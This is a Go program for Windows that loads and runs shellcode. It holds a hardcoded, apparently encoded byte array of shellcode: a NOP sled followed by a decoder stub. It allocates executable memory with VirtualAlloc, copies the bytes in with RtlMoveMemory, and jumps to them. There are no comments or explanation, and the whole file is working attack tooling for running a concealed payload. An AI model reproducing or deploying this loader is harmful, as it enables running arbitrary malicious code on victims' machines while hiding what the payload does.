package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var shellcode = []byte{0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
	0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xdb, 0xff, 0xff,
	0xff, 0x48, 0x8d, 0x05, 0xef, 0xff, 0xff, 0xff, 0x48, 0xbb, 0x0a, 0xb8,
	0xcd, 0xe4, 0x5a, 0xd7, 0xc9, 0xfe, 0x48, 0x31, 0x58, 0x27, 0x48, 0x2d,
	0xf8, 0xff, 0xff, 0xff, 0xe2, 0xf4, 0xf6, 0xf0, 0x4e, 0x00, 0xaa, 0x3f,
	0x09, 0xfe, 0x0a, 0xb8, 0x8c, 0xb5, 0x1b, 0x87, 0x9b, 0xaf, 0x5c, 0xf0,
	0xfc, 0x36, 0x3f, 0x9f, 0x42, 0xac, 0x6a, 0xf0, 0x46, 0xb6, 0x42, 0x9f,
	0x42, 0xac, 0x2a, 0xf0, 0x46, 0x96, 0x0a, 0x9f, 0xc6, 0x49, 0x40, 0xf2,
	0x80, 0xd5, 0x93, 0x9f, 0xf8, 0x3e, 0xa6, 0x84, 0xac, 0x98, 0x58, 0xfb,
	0xe9, 0xbf, 0xcb, 0x71, 0xc0, 0xa5, 0x5b, 0x16, 0x2b, 0x13, 0x58, 0xf9,
	0x9c, 0xac, 0xd1, 0x85, 0xe9, 0x75, 0x48, 0x84, 0x85, 0xe5, 0x8a, 0x5c,
	0x49, 0x76, 0x0a, 0xb8, 0xcd, 0xac, 0xdf, 0x17, 0xbd, 0x99, 0x42, 0xb9,
	0x1d, 0xb4, 0xd1, 0x9f, 0xd1, 0xba, 0x81, 0xf8, 0xed, 0xad, 0x5b, 0x07,
	0x2a, 0xa8, 0x42, 0x47, 0x04, 0xa5, 0xd1, 0xe3, 0x41, 0xb6, 0x0b, 0x6e,
	0x80, 0xd5, 0x93, 0x9f, 0xf8, 0x3e, 0xa6, 0xf9, 0x0c, 0x2d, 0x57, 0x96,
	0xc8, 0x3f, 0x32, 0x58, 0xb8, 0x15, 0x16, 0xd4, 0x85, 0xda, 0x02, 0xfd,
	0xf4, 0x35, 0x2f, 0x0f, 0x91, 0xba, 0x81, 0xf8, 0xe9, 0xad, 0x5b, 0x07,
	0xaf, 0xbf, 0x81, 0xb4, 0x85, 0xa0, 0xd1, 0x97, 0xd5, 0xb7, 0x0b, 0x68,
	0x8c, 0x6f, 0x5e, 0x5f, 0x81, 0xff, 0xda, 0xf9, 0x95, 0xa5, 0x02, 0x89,
	0x90, 0xa4, 0x4b, 0xe0, 0x8c, 0xbd, 0x1b, 0x8d, 0x81, 0x7d, 0xe6, 0x98,
	0x8c, 0xb6, 0xa5, 0x37, 0x91, 0xbf, 0x53, 0xe2, 0x85, 0x6f, 0x48, 0x3e,
	0x9e, 0x01, 0xf5, 0x47, 0x90, 0xac, 0xe0, 0xd6, 0xc9, 0xfe, 0x0a, 0xb8,
	0xcd, 0xe4, 0x5a, 0x9f, 0x44, 0x73, 0x0b, 0xb9, 0xcd, 0xe4, 0x1b, 0x6d,
	0xf8, 0x75, 0x65, 0x3f, 0x32, 0x31, 0xe1, 0x27, 0x7c, 0x5c, 0x5c, 0xf9,
	0x77, 0x42, 0xcf, 0x6a, 0x54, 0x01, 0xdf, 0xf0, 0x4e, 0x20, 0x72, 0xeb,
	0xcf, 0x82, 0x00, 0x38, 0x36, 0x04, 0x2f, 0xd2, 0x72, 0xb9, 0x19, 0xca,
	0xa2, 0x8e, 0x5a, 0x8e, 0x88, 0x77, 0xd0, 0x47, 0x18, 0xa7, 0x60, 0x8b,
	0x9e, 0x97, 0x64, 0xdc, 0xa2, 0x93, 0x29, 0x8b, 0x9a, 0x87, 0x79, 0xcc,
	0xa8, 0x89, 0x69, 0xe5, 0x95, 0x9d, 0x6b, 0xd4, 0xae, 0xca, 0x3f, 0xaf,
	0xac, 0xfe}

func main() {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	rtlMoveMemory := ntdll.NewProc("RtlMoveMemory")

	addr, _, err := virtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		fmt.Println("VirtualAlloc failed:", err)
		return
	}

	_, _, err = rtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Println("RtlMoveMemory failed:", err)
		return
	}

	syscall.SyscallN(addr, 0, 0, 0, 0)
}
